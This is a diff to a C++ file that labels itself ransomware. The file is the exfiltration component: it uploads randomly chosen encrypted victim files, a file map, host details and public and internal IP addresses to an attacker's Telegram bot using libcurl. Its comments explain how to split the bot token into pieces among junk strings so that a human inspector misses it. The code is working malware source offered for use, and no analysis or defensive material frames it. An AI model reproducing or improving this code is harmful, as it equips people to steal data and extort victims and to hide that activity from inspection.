@@ -3,8 +3,9 @@
 //
 // Categorized as RANSOMWARE
 //
-// This is a sub-file for selecting limited random files that are encrypted
-// and then sending them into a created bot in telegram
+// This is a sub-file for selecting limited random files that are encrypted,
+// fetching machine's info, external and internal IP addresses, and file
+// signature, and then sending them into a created bot in telegram
 
 #include <iostream>
 #include <filesystem>
@@ -15,11 +16,28 @@
 #include <curl/curl.h>
 #include <unistd.h>   // for gethostname(), geteuid()
 #include <pwd.h>      // for getpwuid()
+#include <map>
+#include <fstream>
+
+// Callback for cURL response
+size_t writeToString(void *contents, size_t size, size_t nmemb, std::string *output) {
+    size_t totalSize = size * nmemb;
+    output->append((char *)contents, totalSize);
+    return totalSize;
+}
+
 
 namespace fs = std::filesystem;
 using namespace std;
 
 // Obfuscated Telegram bot token, change it into your own token
+// But how to put my token here?
+//
+// You need to slice your token into part and put them in
+// const string part(num) where (num) is the part number.
+// You may add junk(num) strings so it will be hard to detect by
+// (HUMAN) inspector
+
 const string junk1 = "238778346637578690283905992235";
 const string part1 = "8022406930";
 const string junk2 = "527289774364367543";
@@ -32,18 +50,20 @@ const string part4 = "5uFPZSTo_7ZXBoJsk";
 
 const string BOT_TOKEN = part1 + part2 + part3 + part4;
 const string CHAT_ID = "6558072995"; // Your chat ID
-const size_t MAX_SIZE = 50 * 1024 * 1024; // 50MB file limit
+const size_t MAX_SIZE = 50 * 1024 * 1024; // 50MB file limit, mandatory
 const string MAP_FILE = "file_map.txt";  // Must be sent first
 
 bool sendFileToTelegram(const string &filePath) {
     size_t fileSize = fs::file_size(filePath);
     if (fileSize > MAX_SIZE) {
-        cerr << "[SKIP] >50MB: " << filePath << " (" << fileSize / (1024 * 1024) << " MB)\n";
+        cerr << "\033[1;31m[SKIP]\033[0m >50MB: " << filePath << " (" << fileSize / (1024 * 1024) << " MB)\n";
         return false;
     }
 
     CURL *curl = curl_easy_init();
     if (!curl) return false;
+    
+    string response;  // To capture response silently, comment out for verbose output
 
     curl_mime *form = curl_mime_init(curl);
     curl_mimepart *field = nullptr;
@@ -61,10 +81,14 @@ bool sendFileToTelegram(const string &filePath) {
     curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
     curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);
+        // To disable verbose output, comment out the 3 lines below
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeToString);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);  // Disable verbose output
 
     CURLcode res = curl_easy_perform(curl);
     bool ok = (res == CURLE_OK);
-    if (!ok) cerr << "[FAIL] Send failed: " << filePath << "\n";
+    if (!ok) cerr << "\033[1;31m[FAIL]\033[0m Send failed: " << filePath << "\n";
 
     curl_mime_free(form);
     curl_easy_cleanup(curl);
@@ -75,25 +99,68 @@ void sendRandomEncryptedFiles(const string &directory, int maxFiles = 10) {
     // Step 1: Send the file map first
     fs::path mapPath = fs::path(directory) / MAP_FILE;
     if (fs::exists(mapPath)) {
-        cout << "[SEND] Sending file_map.txt first...\n";
+        cout << "\033[1;32m[SEND]\033[0m Sending file_map.txt first...\n";
         sendFileToTelegram(mapPath.string());
     } else {
-        cerr << "[WARN] file_map.txt not found!\n";
+        cerr << "\033[1;31m[WARN]\033[0m file_map.txt not found!\n";
     }
 
-    // Step 2: Collect all "null*" encrypted files
+    // Step 2: Read the file map to get original file paths
+    map<string, string> fileMap;
+    ifstream mapFile(MAP_FILE, ios::binary);
+    if (mapFile) {
+        string encFile, origFile;
+        while (mapFile >> encFile >> std::quoted(origFile)) {
+            fileMap[encFile] = origFile;
+        }
+        mapFile.close();
+    }
+
+    // Step 3: Collect "null*" encrypted files, excluding those that were originally hidden
     vector<fs::path> encryptedFiles;
     for (const auto &entry : fs::recursive_directory_iterator(directory)) {
         if (entry.is_regular_file()) {
             string name = entry.path().filename().string();
+            
             if (name.rfind("null", 0) == 0) {
+                // Check if this encrypted file corresponds to a hidden original file
+                auto it = fileMap.find(name);
+                if (it != fileMap.end()) {
+                    string originalPath = it->second;
+                    
+                    // Check if original file was hidden (starts with .)
+                    fs::path origPath(originalPath);
+                    string origFileName = origPath.filename().string();
+                    if (!origFileName.empty() && origFileName[0] == '.') {
+                        cout << "\033[1;31m[SKIP]\033[0m Skipping hidden file: " << originalPath << endl;
+                        continue;
+                    }
+                    
+                    // Check if original file was in a hidden directory
+                    bool hasHiddenDir = false;
+                    fs::path currentPath = origPath;
+                    while (currentPath != currentPath.parent_path()) {
+                        string dirName = currentPath.filename().string();
+                        if (!dirName.empty() && dirName[0] == '.') {
+                            hasHiddenDir = true;
+                            break;
+                        }
+                        currentPath = currentPath.parent_path();
+                    }
+                    
+                    if (hasHiddenDir) {
+                        cout << "\033[1;31m[SKIP]\033[0m Skipping file in hidden directory: " << originalPath << endl;
+                        continue;
+                    }
+                }
+                
                 encryptedFiles.push_back(entry.path());
             }
         }
     }
 
     if (encryptedFiles.empty()) {
-        cout << "[INFO] No encrypted files found.\n";
+        cout << "\033[1;33m[INFO]\033[0m No non-hidden encrypted files found.\n";
         return;
     }
 
@@ -101,16 +168,24 @@ void sendRandomEncryptedFiles(const string &directory, int maxFiles = 10) {
     auto rng = default_random_engine(chrono::system_clock::now().time_since_epoch().count());
     shuffle(encryptedFiles.begin(), encryptedFiles.end(), rng);
 
-    // Step 3: Send up to `maxFiles` if under 50MB
+    // Step 4: Send up to `maxFiles` if under 50MB
     int sent = 0;
     for (const auto &file : encryptedFiles) {
         if (sendFileToTelegram(file.string())) {
             sent++;
+            // Show original filename if available
+            string encFileName = file.filename().string();
+            auto it = fileMap.find(encFileName);
+            if (it != fileMap.end()) {
+                cout << "\033[1;32m[OK]\033[0m Sent: " << encFileName << " (was: " << it->second << ")" << endl;
+            } else {
+                cout << "\033[1;32m[OK]\033[0m Sent: " << encFileName << endl;
+            }
             if (sent >= maxFiles) break;
         }
     }
 
-    cout << "[DONE] Sent " << sent << " file(s).\n";
+    cout << "\033[1;32m[DONE]\033[0m Sent " << sent << " file(s).\n";
 }
 
 // This part is for sending machine and IP addresses to telegram bot
@@ -131,12 +206,7 @@ string getCommandOutput(const string &cmd) {
     return data;
 }
 
-// Callback for cURL response
-size_t writeToString(void *contents, size_t size, size_t nmemb, string *output) {
-    size_t totalSize = size * nmemb;
-    output->append((char *)contents, totalSize);
-    return totalSize;
-}
+
 
 // Fetch public IP via HTTP
 string getPublicIP() {
@@ -206,11 +276,13 @@ string gatherFullSystemInfo() {
     return info.str();
 }
 
+
 void sendMessageToTelegram(const string &message) {
     CURL *curl = curl_easy_init();
     if (!curl) return;
 
     string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+    string response;  // To capture response silently, comment out for verbose output
 
     char *escapedMsg = curl_easy_escape(curl, message.c_str(), message.length());
     if (!escapedMsg) {
@@ -223,11 +295,15 @@ void sendMessageToTelegram(const string &message) {
     curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 20L);
+    // To disable verbose output, comment out the 3 lines below
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeToString);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);  // Disable verbose output
 
     CURLcode res = curl_easy_perform(curl);
     if (res != CURLE_OK)
-        cerr << "[FAIL] sendMessage: " << curl_easy_strerror(res) << "\n";
+        cerr << "\033[1;31m[FAIL]\033[0m sendMessage: " << curl_easy_strerror(res) << "\n";
 
-    curl_free(escapedMsg); 
+    curl_free(escapedMsg);
     curl_easy_cleanup(curl);
 }
